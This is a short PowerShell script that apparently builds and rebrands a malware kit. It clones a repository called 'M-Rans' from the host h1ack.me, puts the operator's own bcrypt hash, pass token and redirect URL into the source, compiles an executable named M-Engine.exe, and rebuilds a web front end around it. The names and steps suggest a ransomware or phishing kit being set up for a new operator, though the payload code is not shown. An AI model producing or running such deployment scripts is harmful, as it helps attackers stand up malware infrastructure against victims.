$ErrorActionPreference = "Stop"

$bcryptHash = Read-Host "Enter NEW BCRYPT HASH"
$passToken = Read-Host "Enter YOUR NEW PASS TOKEN"
$redirectUrl = Read-Host "Enter YOUR NEW REDIRECT URL"

Write-Host "[+] Cloning repository..."
git clone https://h1ack.me/h1ack/M-Rans.git

Write-Host "[+] Navigating to project directory..."
Set-Location M-Rans/M-Engine

Write-Host "[+] Replacing configuration values..."
(Get-Content config.cs) -replace '\$2a\$12\$xp7Fk0XBRwnxC1x4ibYFWe6sr..PFYkfLd0l/E060l27W4ggUrNVS', $bcryptHash -replace 'PASS-KEY-HERE', $passToken | Set-Content config.cs

Write-Host "[+] Building project..."
dotnet build

Write-Host "[+] Copying executable file..."
$exePath = Get-ChildItem -Path ".\bin\Debug\net*" -Filter "M-Engine.exe" -Recurse | Select-Object -ExpandProperty FullName
Copy-Item -Path $exePath -Destination "../resources" -Force

Write-Host "[+] Replacing URL in JavaScript file..."
(Get-Content ./assets/index-Ba9fV0lF.js) -replace 'https://h1ack.me', $redirectUrl | Set-Content ./assets/index-Ba9fV0lF.js

Write-Host "[+] Running npm build..."
npm run build

Write-Host "[✅] Build process completed successfully!"
